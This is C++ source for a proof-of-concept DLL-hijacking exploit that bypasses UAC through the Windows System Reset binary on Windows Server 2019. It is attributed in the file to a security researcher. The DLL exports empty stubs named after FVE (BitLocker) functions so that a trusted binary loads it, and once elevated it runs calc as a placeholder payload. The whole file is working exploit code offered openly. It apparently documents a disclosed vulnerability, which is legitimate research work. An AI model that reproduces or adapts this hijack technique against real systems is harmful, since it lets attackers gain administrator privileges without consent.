// dllmain.cpp : Defines the entry point for the DLL application.
// Purpose     : UAC Bypass in System Reset Binary via DLL Hijacking
// Author      : Hashim Jawad of ACTIVELabs
// Effected OS : Windows Server 2019 Version 1809 (OS Build 17763.404)

#include "stdafx.h"
#include <Windows.h>

// https://github.com/enigma0x3/MessageBox/blob/a240ca7c609acf76a0f56a91b9d81d62ad032240/src/MessageBox/dllmain.cpp#L5
BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		BOOL isAdmin;
		isAdmin = IsElevated();
		if (isAdmin) {
			WinExec("calc", SW_NORMAL);
			break;
		}
		else {
			break;
		}
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void FveCloseVolume()
{}

extern "C" __declspec(dllexport) void FveOpenVolumeW()
{}

extern "C" __declspec(dllexport) void FveGetStatus()
{}

extern "C" __declspec(dllexport) void FveDeleteDeviceEncryptionOptOutForVolumeW()
{}

extern "C" __declspec(dllexport) void FveAddAuthMethodInformation()
{}

extern "C" __declspec(dllexport) void FveCommitChanges()
{}

extern "C" __declspec(dllexport) void FveConversionDecrypt()
{}

extern "C" __declspec(dllexport) void FveDeleteAuthMethod()
{}

extern "C" __declspec(dllexport) void FveGetAuthMethodInformation()
{}

extern "C" __declspec(dllexport) void FveRevertVolume()
{}